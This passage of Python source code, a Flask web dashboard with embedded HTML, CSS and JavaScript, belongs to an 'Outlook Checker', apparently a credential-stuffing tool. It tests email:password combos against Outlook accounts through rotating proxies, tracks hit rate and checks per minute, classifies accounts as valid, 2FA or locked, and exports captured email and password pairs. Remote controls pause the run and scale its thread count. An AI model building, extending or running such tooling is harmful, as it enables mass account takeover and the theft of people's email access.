        + counters.get('imap_valid', 0)
    )
    total_invalid = (
        counters.get('locked', 0) + counters.get('recovery', 0)
        + counters.get('password', 0) + counters.get('not_exist', 0)
        + counters.get('invalid', 0)
    )
    remaining = _total_combos_web - total_checked
    elapsed = time.time() - _start_time_web if _start_time_web else 0.0
    speed = total_checked / elapsed if elapsed > 0 else 0.0
    cpm = speed * 60.0
    eta_seconds = remaining / speed if speed > 0 else 0.0
    if eta_seconds > 3600:
        eta_str = f"{int(eta_seconds // 3600)}h {int((eta_seconds % 3600) // 60)}m"
    elif eta_seconds > 60:
        eta_str = f"{int(eta_seconds // 60)}m {int(eta_seconds % 60)}s"
    else:
        eta_str = f"{int(eta_seconds)}s"
    pct = (total_checked / _total_combos_web *
           100.0) if _total_combos_web > 0 else 0.0
    hit_rate = (total_valid / total_checked *
                100.0) if total_checked > 0 else 0.0
    data = {
        'counters': counters,
        'total_checked': total_checked,
        'total_valid': total_valid,
        'total_invalid': total_invalid,
        'total_combos': _total_combos_web,
        'remaining': remaining,
        'pct': round(pct, 2),
        'speed': round(speed, 2),
        'cpm': round(cpm, 1),
        'hit_rate': round(hit_rate, 2),
        'eta': eta_str,
        'runtime': _format_elapsed(elapsed),
        'uptime': round(elapsed, 1),
        'active_threads': active_threads,
        'target_threads': _target_threads_web,
        'paused': _paused_web,
    }
    if _rate_limiter_web is not None:
        try:
            data['rate_limiter'] = {
                'current_delay': getattr(_rate_limiter_web, 'current_delay', 0),
                'total_rate_limits': getattr(_rate_limiter_web, 'total_rate_limits', 0),
                'is_throttled': getattr(_rate_limiter_web, 'is_throttled', False),
            }
        except Exception:
            pass
    if _proxy_monitor_web is not None:
        try:
            proxies = _get_proxy_list_web()
            alive = sum(1 for p in proxies if p.get('alive'))
            data['proxy_summary'] = {
                'total': len(proxies),
                'alive': alive,
                'dead': len(proxies) - alive,
            }
        except Exception:
            pass
    return data


def _get_proxy_list_web():
    if _proxy_monitor_web is None:
        return []
    try:
        proxies_raw = getattr(_proxy_monitor_web, 'proxies', None)
        if proxies_raw is None:
            proxies_raw = getattr(_proxy_monitor_web, 'proxy_list', [])
        result = []
        for p in proxies_raw:
            if isinstance(p, dict):
                result.append({
                    'address': p.get('address', p.get('url', str(p))),
                    'alive': p.get('alive', p.get('is_alive', True)),
                    'latency': round(p.get('latency', p.get('avg_latency', 0)), 1),
                    'country': p.get('country', '??'),
                    'success_count': p.get('success_count', p.get('successes', 0)),
                    'fail_count': p.get('fail_count', p.get('failures', 0)),
                })
            else:
                result.append({
                    'address': getattr(p, 'address', getattr(p, 'url', str(p))),
                    'alive': getattr(p, 'alive', getattr(p, 'is_alive', True)),
                    'latency': round(getattr(p, 'latency', getattr(p, 'avg_latency', 0)), 1),
                    'country': getattr(p, 'country', '??'),
                    'success_count': getattr(p, 'success_count', getattr(p, 'successes', 0)),
                    'fail_count': getattr(p, 'fail_count', getattr(p, 'failures', 0)),
                })
        return result
    except Exception:
        return []


def _check_api_key():
    if _api_key_web is None:
        return None
    key = request.headers.get('X-API-Key') or request.args.get('key')
    if key != _api_key_web:
        return jsonify({'error': 'unauthorized', 'message': 'Invalid or missing API key'}), 401
    return None


def _read_output_file(path):
    try:
        with open(path, 'r', encoding='utf-8', errors='replace') as fh:
            return [line.strip() for line in fh if line.strip()]
    except FileNotFoundError:
        return []
    except Exception:
        return []


# ---- Flask app ----
app = Flask(__name__)
_werkzeug_log = logging.getLogger('werkzeug')
_werkzeug_log.setLevel(logging.ERROR)


@app.route('/')
def index():
    return Response(DASHBOARD_HTML, content_type='text/html')


@app.route('/api/stats')
def api_stats():
    return jsonify(_build_stats_dict())


@app.route('/api/activity')
def api_activity():
    try:
        limit = int(request.args.get('limit', 50))
        offset = int(request.args.get('offset', 0))
    except (ValueError, TypeError):
        limit, offset = 50, 0
    with _activity_lock_web:
        total = len(_activity_log_web)
        start = max(0, total - offset - limit)
        end = total - offset
        page = list(_activity_log_web[start:end])
    return jsonify({
        'entries': page,
        'total': total,
        'limit': limit,
        'offset': offset,
    })


@app.route('/api/stream')
def api_stream():
    def _generate():
        while True:
            data = _build_stats_dict()
            with _activity_lock_web:
                data['recent_activity'] = list(_activity_log_web[-10:])
            yield f"data: {json.dumps(data)}\n\n"
            time.sleep(1)
    return Response(_generate(), content_type='text/event-stream',
                    headers={'Cache-Control': 'no-cache', 'X-Accel-Buffering': 'no'})


@app.route('/api/proxies')
def api_proxies():
    proxies = _get_proxy_list_web()
    return jsonify({'proxies': proxies, 'total': len(proxies)})


@app.route('/api/geo')
def api_geo():
    if _geo_proxy_pool_web is None:
        return jsonify({'distribution': {}, 'locations': []})
    try:
        distribution = {}
        locations = []
        pool_proxies = getattr(_geo_proxy_pool_web, 'proxies', getattr(
            _geo_proxy_pool_web, 'pool', []))
        for p in pool_proxies:
            if isinstance(p, dict):
                country = p.get('country', 'Unknown')
                lat = p.get('lat', p.get('latitude', 0))
                lon = p.get('lon', p.get('longitude', 0))
            else:
                country = getattr(p, 'country', 'Unknown')
                lat = getattr(p, 'lat', getattr(p, 'latitude', 0))
                lon = getattr(p, 'lon', getattr(p, 'longitude', 0))
            distribution[country] = distribution.get(country, 0) + 1
            locations.append({'country': country, 'lat': lat, 'lon': lon})
        return jsonify({'distribution': distribution, 'locations': locations})
    except Exception:
        return jsonify({'distribution': {}, 'locations': []})


@app.route('/api/history')
def api_history():
    with _cpm_lock_web:
        data = list(_cpm_history_web)
    return jsonify({'history': data, 'total': len(data)})


@app.route('/api/export')
def api_export():
    auth_err = _check_api_key()
    if auth_err:
        return auth_err
    fmt = request.args.get('format', 'txt').lower()
    filt = request.args.get('filter', 'all').lower()
    fields_raw = request.args.get('fields', 'email,password,reason,capture')
    fields = [f.strip() for f in fields_raw.split(',') if f.strip()]
    file_map = {
        'valid': ['output/valid.txt'],
        '2fa': ['output/valid.txt'],
        'consent': ['output/valid.txt'],
        'pending': ['output/valid.txt'],
        'imap': ['output/valid.txt'],
        'locked': ['output/others/locked.txt'],
        'recovery': ['output/others/recovery.txt'],
        'password': ['output/others/wrong_password.txt'],
        'not_exist': ['output/others/not_exist.txt'],
        'invalid': ['output/others/invalid.txt'],
        'failed': ['output/others/failed.txt'],
    }
    if filt == 'all':
        files_to_read = []
        for paths in file_map.values():
            files_to_read.extend(paths)
    else:
        files_to_read = file_map.get(filt, [])
    records = []
    for fp in files_to_read:
        reason_key = [k for k, v in file_map.items() if fp in v]
        reason = reason_key[0] if reason_key else 'unknown'
        lines = _read_output_file(fp)
        for line in lines:
            parts = line.split(':', 1)
            rec = {}
            if 'email' in fields:
                rec['email'] = parts[0] if parts else ''
            if 'password' in fields:
                rec['password'] = parts[1] if len(parts) > 1 else ''
            if 'reason' in fields:
                rec['reason'] = reason
            if 'capture' in fields:
                rec['capture'] = ''
                if '|' in line:
                    rec['capture'] = line.split('|', 1)[1].strip()
            records.append(rec)
    if fmt == 'json':
        return Response(
            json.dumps({'results': records, 'total': len(records)}, indent=2),
            content_type='application/json',
            headers={'Content-Disposition': 'attachment; filename=export.json'},
        )
    if fmt == 'csv':
        buf = io.StringIO()
        writer = csv.DictWriter(buf, fieldnames=fields, extrasaction='ignore')
        writer.writeheader()
        for rec in records:
            writer.writerow(rec)
        return Response(
            buf.getvalue(),
            content_type='text/csv',
            headers={'Content-Disposition': 'attachment; filename=export.csv'},
        )
    lines_out = []
    for rec in records:
        line_parts = [rec.get(f, '') for f in fields]
        lines_out.append(':'.join(line_parts))
    return Response(
        '\n'.join(lines_out),
        content_type='text/plain',
        headers={'Content-Disposition': 'attachment; filename=export.txt'},
    )


@app.route('/api/control/pause', methods=['POST'])
def api_control_pause():
    global _paused_web
    auth_err = _check_api_key()
    if auth_err:
        return auth_err
    if _pause_func_web:
        _pause_func_web()
        _paused_web = True
        return jsonify({'status': 'paused'})
    return jsonify({'error': 'pause not configured'}), 501


@app.route('/api/control/resume', methods=['POST'])
def api_control_resume():
    global _paused_web
    auth_err = _check_api_key()
    if auth_err:
        return auth_err
    if _resume_func_web:
        _resume_func_web()
        _paused_web = False
        return jsonify({'status': 'resumed'})
    return jsonify({'error': 'resume not configured'}), 501


@app.route('/api/control/threads', methods=['POST'])
def api_control_threads():
    global _target_threads_web
    auth_err = _check_api_key()
    if auth_err:
        return auth_err
    body = request.get_json(silent=True) or {}
    count = body.get('threads')
    if count is None or not isinstance(count, int) or count < 1:
        return jsonify({'error': 'Invalid thread count. Provide {"threads": N} with N >= 1'}), 400
    if _set_threads_func_web:
        _set_threads_func_web(count)
    _target_threads_web = count
    return jsonify({'status': 'ok', 'threads': count})


@app.route('/api/health')
def api_health():
    elapsed = time.time() - _start_time_web if _start_time_web else 0.0
    return jsonify({
        'status': 'ok',
        'uptime': round(elapsed, 1),
        'uptime_formatted': _format_elapsed(elapsed),
    })


def start_web_dashboard(port=8080):
    cpm_thread = threading.Thread(
        target=_cpm_recorder_loop, daemon=True, name='cpm-recorder')
    cpm_thread.start()
    server_thread = threading.Thread(
        target=lambda: app.run(host='0.0.0.0', port=port,
                               debug=False, use_reloader=False, threaded=True),
        daemon=True,
        name='web-dashboard',
    )
    server_thread.start()
    return server_thread


# ---- DASHBOARD_HTML (embedded) ----
DASHBOARD_HTML = r'''<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Outlook Checker — Dashboard</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
<script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js"></script>
<style>
/* ===== RESET & BASE ===== */
*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
:root{
  --bg:#0a0a0f;--card:rgba(255,255,255,0.03);--card-border:rgba(255,255,255,0.06);
  --card-hover-border:rgba(102,126,234,0.35);--text:#e2e8f0;--text-dim:#64748b;
  --text-muted:#475569;--accent:linear-gradient(135deg,#667eea,#764ba2);
  --accent-solid:#667eea;--green:#22c55e;--cyan:#06b6d4;--blue:#3b82f6;
  --amber:#f59e0b;--teal:#2dd4bf;--orange:#fb923c;--yellow:#eab308;
  --red:#ef4444;--dark-red:#dc2626;--gray:#6b7280;--magenta:#a855f7;
  --radius:16px;--radius-sm:12px;--radius-xs:8px;
  --shadow:0 4px 24px rgba(0,0,0,0.4);--transition:0.3s ease;
}
html{scroll-behavior:smooth}
body{font-family:'Inter',system-ui,-apple-system,sans-serif;background:var(--bg);color:var(--text);min-height:100vh;overflow-x:hidden;line-height:1.5}
body::before{content:'';position:fixed;inset:0;background:radial-gradient(ellipse at 20% 40%,rgba(102,126,234,0.07) 0%,transparent 55%),radial-gradient(ellipse at 80% 20%,rgba(118,75,162,0.06) 0%,transparent 50%),radial-gradient(ellipse at 50% 90%,rgba(34,197,94,0.04) 0%,transparent 50%);pointer-events:none;z-index:0}
.container{max-width:1440px;margin:0 auto;padding:20px;position:relative;z-index:1}
a{color:var(--accent-solid);text-decoration:none}

/* ===== SCROLLBAR ===== */
::-webkit-scrollbar{width:5px;height:5px}
::-webkit-scrollbar-track{background:transparent}
::-webkit-scrollbar-thumb{background:#334155;border-radius:3px}

/* ===== NAVBAR ===== */
.navbar{display:flex;align-items:center;justify-content:space-between;padding:16px 24px;background:var(--card);backdrop-filter:blur(12px);border:1px solid var(--card-border);border-radius:var(--radius);margin-bottom:20px;flex-wrap:wrap;gap:12px}
.nav-brand{display:flex;align-items:center;gap:10px}
.nav-brand h1{font-size:20px;font-weight:800;background:var(--accent);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;white-space:nowrap}
.nav-brand .logo{font-size:24px}
.nav-meta{display:flex;align-items:center;gap:20px;font-size:13px;color:var(--text-dim);flex-wrap:wrap}
.nav-meta .val{color:var(--text);font-weight:600}
.live-badge{display:inline-flex;align-items:center;gap:5px;background:rgba(34,197,94,0.12);color:var(--green);padding:4px 10px;border-radius:20px;font-size:11px;font-weight:700;letter-spacing:0.5px}
.live-dot{width:7px;height:7px;background:var(--green);border-radius:50%;animation:pulse 1.5s infinite}
.conn-status{display:inline-flex;align-items:center;gap:4px;font-size:11px;padding:3px 8px;border-radius:12px;font-weight:600}
.conn-status.connected{background:rgba(34,197,94,0.1);color:var(--green)}
.conn-status.polling{background:rgba(245,158,11,0.1);color:var(--amber)}

/* ===== PROGRESS ===== */
.progress-section{padding:20px 24px;background:var(--card);backdrop-filter:blur(12px);border:1px solid var(--card-border);border-radius:var(--radius);margin-bottom:20px}
.progress-bar-wrap{width:100%;height:22px;background:rgba(30,41,59,0.8);border-radius:12px;overflow:hidden;position:relative}
.progress-bar-fill{height:100%;border-radius:12px;background:linear-gradient(90deg,#22c55e,#38bdf8,#667eea,#764ba2);background-size:300% 100%;animation:gradient 3s ease infinite;transition:width 0.6s ease;min-width:0}
.progress-info{display:flex;justify-content:space-between;align-items:baseline;margin-top:10px;font-size:13px;color:var(--text-dim);flex-wrap:wrap;gap:8px}
.progress-info .pct{font-size:22px;font-weight:800;color:var(--text)}

/* ===== STAT CARDS ===== */
.stats-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:12px;margin-bottom:20px}
.stat-card{padding:16px;background:var(--card);backdrop-filter:blur(12px);border:1px solid var(--card-border);border-radius:14px;text-align:center;transition:transform var(--transition),border-color var(--transition),box-shadow var(--transition);cursor:default}
.stat-card:hover{transform:translateY(-2px);border-color:var(--card-hover-border);box-shadow:0 8px 30px rgba(102,126,234,0.08)}
.stat-card .icon{font-size:20px;margin-bottom:4px}
.stat-card .label{font-size:10px;text-transform:uppercase;letter-spacing:0.8px;color:var(--text-dim);font-weight:600;margin-bottom:6px}
.stat-card .value{font-size:26px;font-weight:800;transition:color 0.3s}

/* Card color classes */
.c-green .value{color:var(--green)}.c-cyan .value{color:var(--cyan)}.c-blue .value{color:var(--blue)}
.c-amber .value{color:var(--amber)}.c-teal .value{color:var(--teal)}.c-orange .value{color:var(--orange)}
.c-yellow .value{color:var(--yellow)}.c-red .value{color:var(--red)}.c-dark-red .value{color:var(--dark-red)}
.c-gray .value{color:var(--gray)}.c-magenta .value{color:var(--magenta)}

/* ===== PANELS / CARDS ===== */
.panel{padding:22px;background:var(--card);backdrop-filter:blur(12px);border:1px solid var(--card-border);border-radius:var(--radius);transition:border-color var(--transition)}
.panel:hover{border-color:rgba(255,255,255,0.1)}
.panel-title{font-size:13px;font-weight:700;color:var(--text-dim);text-transform:uppercase;letter-spacing:0.6px;margin-bottom:16px;display:flex;align-items:center;gap:8px}

/* ===== CHARTS SECTION ===== */
.charts-grid{display:grid;grid-template-columns:1.3fr 0.7fr;gap:16px;margin-bottom:20px}
.chart-wrap{position:relative;height:280px}

/* ===== PROXY SECTION ===== */
.proxy-section{margin-bottom:20px}
.proxy-header{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;margin-bottom:14px}
.proxy-stat{padding:14px;background:var(--card);border:1px solid var(--card-border);border-radius:var(--radius-sm);text-align:center}
.proxy-stat .ps-label{font-size:10px;text-transform:uppercase;color:var(--text-dim);font-weight:600;letter-spacing:0.5px}
.proxy-stat .ps-value{font-size:22px;font-weight:800;margin-top:4px}
.proxy-table-wrap{overflow-x:auto;border-radius:var(--radius-sm);border:1px solid var(--card-border);background:var(--card);backdrop-filter:blur(12px)}
table.proxy-table{width:100%;border-collapse:collapse;font-size:12px}
.proxy-table th{padding:10px 14px;text-align:left;font-size:10px;text-transform:uppercase;letter-spacing:0.5px;color:var(--text-dim);font-weight:700;border-bottom:1px solid var(--card-border);cursor:pointer;user-select:none;white-space:nowrap}
.proxy-table th:hover{color:var(--accent-solid)}
.proxy-table td{padding:8px 14px;border-bottom:1px solid rgba(255,255,255,0.02);white-space:nowrap}
.proxy-table tr:hover td{background:rgba(102,126,234,0.04)}
.badge{display:inline-block;padding:2px 8px;border-radius:10px;font-size:10px;font-weight:700}
.badge-alive{background:rgba(34,197,94,0.15);color:var(--green)}
.badge-dead{background:rgba(239,68,68,0.15);color:var(--red)}

/* ===== GEO SECTION ===== */
.geo-section{margin-bottom:20px}
.geo-grid{display:grid;grid-template-columns:1fr 1fr;gap:16px}
.geo-map-placeholder{height:260px;border-radius:var(--radius-sm);background:rgba(15,23,42,0.5);border:1px dashed rgba(255,255,255,0.08);display:flex;align-items:center;justify-content:center;color:var(--text-muted);font-size:13px;text-align:center;padding:20px}
.geo-bars{max-height:260px;overflow-y:auto}
.geo-bar-row{display:flex;align-items:center;gap:10px;padding:6px 0}
.geo-bar-label{min-width:40px;font-size:12px;font-weight:600;color:var(--text-dim)}
.geo-bar-track{flex:1;height:8px;background:rgba(30,41,59,0.8);border-radius:4px;overflow:hidden}
.geo-bar-fill{height:100%;border-radius:4px;background:var(--accent);transition:width 0.5s ease}
.geo-bar-count{min-width:30px;text-align:right;font-size:11px;font-weight:700;color:var(--text)}

/* ===== ACTIVITY LOG ===== */
.activity-section{margin-bottom:20px}
.activity-grid{display:grid;grid-template-columns:1fr 1fr;gap:16px}
.activity-log{max-height:320px;overflow-y:auto;font-size:12px}
.log-entry{padding:7px 10px;border-bottom:1px solid rgba(255,255,255,0.02);display:flex;gap:10px;align-items:center;animation:slideIn 0.3s ease;transition:background 0.15s}
.log-entry:hover{background:rgba(102,126,234,0.04)}
.log-time{color:var(--text-muted);min-width:62px;font-size:11px;font-variant-numeric:tabular-nums}
.log-thread{color:var(--accent-solid);min-width:36px;font-weight:600;font-size:11px}
.log-status{font-weight:700;min-width:160px;font-size:11px}
.log-account{color:var(--text-dim);overflow:hidden;text-overflow:ellipsis;white-space:nowrap;font-size:11px}
.log-status.s-valid{color:var(--green)}.log-status.s-locked{color:var(--amber)}.log-status.s-rate{color:var(--magenta)}
.log-status.s-invalid{color:var(--red)}.log-status.s-failed{color:var(--gray)}.log-status.s-imap{color:var(--teal)}

/* ===== EXPORT & CONTROLS ===== */
.tools-grid{display:grid;grid-template-columns:1fr 1fr;gap:16px;margin-bottom:20px}
.form-group{margin-bottom:12px}
.form-label{font-size:11px;text-transform:uppercase;letter-spacing:0.5px;color:var(--text-dim);font-weight:600;margin-bottom:6px;display:block}
select,input[type=number]{width:100%;padding:8px 12px;background:rgba(15,23,42,0.8);border:1px solid var(--card-border);border-radius:var(--radius-xs);color:var(--text);font-size:13px;font-family:inherit;outline:none;transition:border-color var(--transition)}
select:focus,input[type=number]:focus{border-color:var(--accent-solid)}
.checkbox-group{display:flex;flex-wrap:wrap;gap:8px}
.checkbox-group label{display:inline-flex;align-items:center;gap:4px;font-size:12px;color:var(--text-dim);cursor:pointer}
.checkbox-group input[type=checkbox]{accent-color:var(--accent-solid)}
.btn{display:inline-flex;align-items:center;justify-content:center;gap:6px;padding:10px 20px;border:none;border-radius:var(--radius-sm);font-size:13px;font-weight:700;font-family:inherit;cursor:pointer;transition:all var(--transition);letter-spacing:0.3px}
.btn-primary{background:var(--accent);color:#fff;box-shadow:0 4px 15px rgba(102,126,234,0.3)}
.btn-primary:hover{transform:translateY(-1px);box-shadow:0 6px 20px rgba(102,126,234,0.4)}
.btn-success{background:linear-gradient(135deg,#22c55e,#16a34a);color:#fff}
.btn-success:hover{transform:translateY(-1px);box-shadow:0 4px 15px rgba(34,197,94,0.3)}
.btn-warning{background:linear-gradient(135deg,#f59e0b,#d97706);color:#000}
.btn-warning:hover{transform:translateY(-1px)}
.btn-danger{background:linear-gradient(135deg,#ef4444,#dc2626);color:#fff}
.btn-danger:hover{transform:translateY(-1px)}
.btn-group{display:flex;gap:8px;flex-wrap:wrap;margin-top:12px}
.slider-wrap{display:flex;align-items:center;gap:12px;margin-top:8px}
.slider-wrap input[type=range]{flex:1;accent-color:var(--accent-solid);height:6px}
.slider-val{font-size:18px;font-weight:800;color:var(--text);min-width:40px;text-align:center}

/* ===== FOOTER ===== */
.footer{text-align:center;padding:20px;font-size:11px;color:var(--text-muted);border-top:1px solid var(--card-border);margin-top:10px}
.footer a{color:var(--accent-solid);font-weight:600}

/* ===== ANIMATIONS ===== */
@keyframes pulse{0%,100%{opacity:1;transform:scale(1)}50%{opacity:0.4;transform:scale(0.75)}}
@keyframes slideIn{from{opacity:0;transform:translateX(-8px)}to{opacity:1;transform:translateX(0)}}
@keyframes gradient{0%{background-position:0% 50%}50%{background-position:100% 50%}100%{background-position:0% 50%}}
@keyframes fadeIn{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:translateY(0)}}

/* ===== RESPONSIVE ===== */
@media(max-width:1200px){
  .stats-grid{grid-template-columns:repeat(3,1fr)}
  .charts-grid,.activity-grid,.tools-grid,.geo-grid{grid-template-columns:1fr}
}
@media(max-width:768px){
  .stats-grid{grid-template-columns:repeat(2,1fr)}
  .navbar{flex-direction:column;align-items:flex-start}
  .nav-meta{width:100%;justify-content:flex-start;gap:12px}
  .proxy-header{grid-template-columns:1fr}
  .container{padding:12px}
  .stat-card .value{font-size:22px}
}
@media(max-width:480px){
  .stats-grid{grid-template-columns:1fr}
  .stat-card{padding:12px}
  .nav-brand h1{font-size:16px}
}
</style>
</head>
<body>
<div class="container">

<!-- ===== NAVBAR ===== -->
<nav class="navbar">
  <div class="nav-brand">
    <span class="logo">🚀</span>
    <h1>Outlook Checker Dashboard</h1>
  </div>
  <div class="nav-meta">
    <span class="live-badge"><span class="live-dot"></span>LIVE</span>
    <span>Runtime: <span class="val" id="runtime">00:00:00</span></span>
    <span>Speed: <span class="val" id="speed">0.0</span> /s</span>
    <span>CPM: <span class="val" id="cpm">0</span></span>
    <span>Threads: <span class="val" id="threads">0/0</span></span>
    <span>ETA: <span class="val" id="eta">--</span></span>
    <span class="conn-status connected" id="connStatus">● SSE</span>
  </div>
</nav>

<!-- ===== PROGRESS ===== -->
<div class="progress-section">
  <div class="progress-bar-wrap">
    <div class="progress-bar-fill" id="progressBar" style="width:0%"></div>
  </div>
  <div class="progress-info">
    <span class="pct" id="progressPct">0.0%</span>
    <span><span id="checked">0</span> / <span id="total">0</span> checked</span>
    <span><span id="remaining">0</span> remaining</span>
    <span>Hit Rate: <span class="val" id="hitRate">0.0</span>%</span>
  </div>
</div>

<!-- ===== STAT CARDS ===== -->
<div class="stats-grid">
  <div class="stat-card c-green"><div class="icon">✅</div><div class="label">Valid</div><div class="value" id="s-valid">0</div></div>
  <div class="stat-card c-cyan"><div class="icon">🔐</div><div class="label">2FA</div><div class="value" id="s-2fa">0</div></div>
  <div class="stat-card c-blue"><div class="icon">📋</div><div class="label">Consent</div><div class="value" id="s-consent">0</div></div>
  <div class="stat-card c-amber"><div class="icon">⏳</div><div class="label">Pending</div><div class="value" id="s-pending_security">0</div></div>
  <div class="stat-card c-teal"><div class="icon">📧</div><div class="label">IMAP Valid</div><div class="value" id="s-imap_valid">0</div></div>
  <div class="stat-card c-orange"><div class="icon">🔒</div><div class="label">Locked</div><div class="value" id="s-locked">0</div></div>
  <div class="stat-card c-yellow"><div class="icon">🔄</div><div class="label">Recovery</div><div class="value" id="s-recovery">0</div></div>
  <div class="stat-card c-red"><div class="icon">❌</div><div class="label">Wrong PW</div><div class="value" id="s-password">0</div></div>
  <div class="stat-card c-gray"><div class="icon">👻</div><div class="label">Not Exist</div><div class="value" id="s-not_exist">0</div></div>
  <div class="stat-card c-dark-red"><div class="icon">⚠️</div><div class="label">Invalid</div><div class="value" id="s-invalid">0</div></div>
  <div class="stat-card c-dark-red"><div class="icon">💀</div><div class="label">Failed</div><div class="value" id="s-failed">0</div></div>
  <div class="stat-card c-magenta"><div class="icon">🚦</div><div class="label">Rate Limited</div><div class="value" id="s-rate_limited">0</div></div>
</div>

<!-- ===== CHARTS ===== -->
<div class="charts-grid">
  <div class="panel">
    <div class="panel-title">📈 CPM &amp; Hit Rate Over Time</div>
    <div class="chart-wrap"><canvas id="cpmChart"></canvas></div>
  </div>
  <div class="panel">
    <div class="panel-title">🍩 Result Distribution</div>
    <div class="chart-wrap"><canvas id="doughnutChart"></canvas></div>
  </div>
</div>

<!-- ===== ACTIVITY + GEO ===== -->
<div class="activity-section">
  <div class="activity-grid">
    <div class="panel">
      <div class="panel-title">📝 Live Activity Feed</div>
      <div class="activity-log" id="activityLog">
        <div class="log-entry"><span class="log-time" style="color:var(--text-muted)">Waiting for results…</span></div>
      </div>
    </div>
    <div class="panel">
      <div class="panel-title">🌍 Geo Distribution</div>
      <div class="geo-bars" id="geoBars">
        <div style="color:var(--text-muted);font-size:12px;padding:20px 0;text-align:center">
          No geo data available yet. Configure GeoProxyPool to see distribution.
        </div>
      </div>
    </div>
  </div>
</div>

<!-- ===== PROXY ANALYTICS ===== -->
<div class="proxy-section" id="proxySection" style="display:none">
  <div class="proxy-header">
    <div class="proxy-stat"><div class="ps-label">Total Proxies</div><div class="ps-value" id="proxyTotal" style="color:var(--blue)">0</div></div>
    <div class="proxy-stat"><div class="ps-label">Alive</div><div class="ps-value" id="proxyAlive" style="color:var(--green)">0</div></div>
    <div class="proxy-stat"><div class="ps-label">Dead</div><div class="ps-value" id="proxyDead" style="color:var(--red)">0</div></div>
  </div>
  <div class="proxy-table-wrap">
    <table class="proxy-table">
      <thead>
        <tr>
          <th data-sort="address">Address</th>
          <th data-sort="alive">Status</th>
          <th data-sort="latency">Latency (ms)</th>
          <th data-sort="country">Country</th>
          <th data-sort="success_count">Success</th>
          <th data-sort="fail_count">Fails</th>
        </tr>
      </thead>
      <tbody id="proxyTableBody"></tbody>
    </table>
  </div>
</div>

<!-- ===== EXPORT & CONTROLS ===== -->
<div class="tools-grid">
  <div class="panel">
    <div class="panel-title">📦 Export Results</div>
    <div class="form-group">
      <label class="form-label">Format</label>
      <select id="exportFormat">
        <option value="txt">Plain Text (.txt)</option>
        <option value="csv">CSV (.csv)</option>
        <option value="json">JSON (.json)</option>
      </select>
    </div>
    <div class="form-group">
      <label class="form-label">Filter</label>
      <select id="exportFilter">
        <option value="all">All Results</option>
        <option value="valid">Valid Only</option>
        <option value="2fa">2FA Only</option>
        <option value="consent">Consent Only</option>
        <option value="pending">Pending Security</option>
        <option value="imap">IMAP Valid</option>
        <option value="locked">Locked</option>
        <option value="recovery">Recovery</option>
        <option value="password">Wrong Password</option>
        <option value="not_exist">Not Exist</option>
        <option value="invalid">Invalid</option>
        <option value="failed">Failed</option>
      </select>
    </div>
    <div class="form-group">
      <label class="form-label">Fields</label>
      <div class="checkbox-group">
        <label><input type="checkbox" value="email" class="export-field" checked>Email</label>
        <label><input type="checkbox" value="password" class="export-field" checked>Password</label>
        <label><input type="checkbox" value="reason" class="export-field" checked>Reason</label>
        <label><input type="checkbox" value="capture" class="export-field">Capture</label>
      </div>
    </div>
    <button class="btn btn-primary" onclick="doExport()">⬇ Download Export</button>
  </div>

  <div class="panel">
    <div class="panel-title">🎛️ Controls</div>
    <div class="btn-group">
      <button class="btn btn-warning" id="btnPause" onclick="controlPause()">⏸ Pause</button>
      <button class="btn btn-success" id="btnResume" onclick="controlResume()">▶ Resume</button>
    </div>
    <div class="form-group" style="margin-top:18px">
      <label class="form-label">Thread Count</label>
      <div class="slider-wrap">
        <input type="range" id="threadSlider" min="1" max="200" value="50">
        <span class="slider-val" id="threadSliderVal">50</span>
      </div>
      <button class="btn btn-primary" style="margin-top:10px" onclick="setThreads()">Apply Threads</button>
    </div>
    <div style="margin-top:18px">
      <div class="panel-title" style="margin-bottom:8px">System Status</div>
      <div style="font-size:12px;color:var(--text-dim)" id="systemStatus">
        <div>⏱ Uptime: <span class="val" id="uptimeVal">0s</span></div>
        <div>📊 CPM History Points: <span class="val" id="historyPoints">0</span></div>
        <div>🔌 Connection: <span class="val" id="connDetail">Initializing…</span></div>
      </div>
    </div>
  </div>
</div>

<!-- ===== FOOTER ===== -->
<div class="footer">
  Outlook Checker Dashboard &mdash; Built by <a href="https://t.me/occursive" target="_blank">t.me/occursive</a> &mdash; Real-time analytics powered by SSE
</div>

</div><!-- /.container -->

<script>
/* ================================================================
   JAVASCRIPT — Real-time Dashboard SPA
   ================================================================ */

// ---------- Chart.js: CPM Line Chart ----------
const cpmCtx = document.getElementById('cpmChart').getContext('2d');
const cpmGradient = cpmCtx.createLinearGradient(0, 0, 0, 280);
cpmGradient.addColorStop(0, 'rgba(102,126,234,0.25)');
cpmGradient.addColorStop(1, 'rgba(102,126,234,0.0)');

const hitGradient = cpmCtx.createLinearGradient(0, 0, 0, 280);
hitGradient.addColorStop(0, 'rgba(34,197,94,0.15)');
hitGradient.addColorStop(1, 'rgba(34,197,94,0.0)');

const cpmChart = new Chart(cpmCtx, {
  type: 'line',
  data: {
    labels: [],
    datasets: [
      { label:'CPM', data:[], borderColor:'#667eea', backgroundColor:cpmGradient, fill:true, tension:0.4, pointRadius:0, borderWidth:2, yAxisID:'y' },
      { label:'Hit Rate %', data:[], borderColor:'#22c55e', backgroundColor:hitGradient, fill:true, tension:0.4, pointRadius:0, borderWidth:1.5, borderDash:[4,3], yAxisID:'y1' }
    ]
  },
  options: {
    responsive:true, maintainAspectRatio:false,
    interaction:{mode:'index',intersect:false},
    plugins:{legend:{labels:{color:'#94a3b8',font:{size:11},usePointStyle:true,pointStyle:'circle'}}},
    scales:{
      x:{ticks:{color:'#475569',maxTicksLimit:10,font:{size:10}},grid:{color:'rgba(255,255,255,0.03)'}},
      y:{type:'linear',position:'left',ticks:{color:'#667eea',font:{size:10}},grid:{color:'rgba(255,255,255,0.03)'},beginAtZero:true,title:{display:true,text:'CPM',color:'#667eea',font:{size:10}}},
      y1:{type:'linear',position:'right',ticks:{color:'#22c55e',font:{size:10},callback:v=>v+'%'},grid:{drawOnChartArea:false},beginAtZero:true,max:100,title:{display:true,text:'Hit %',color:'#22c55e',font:{size:10}}}
    }
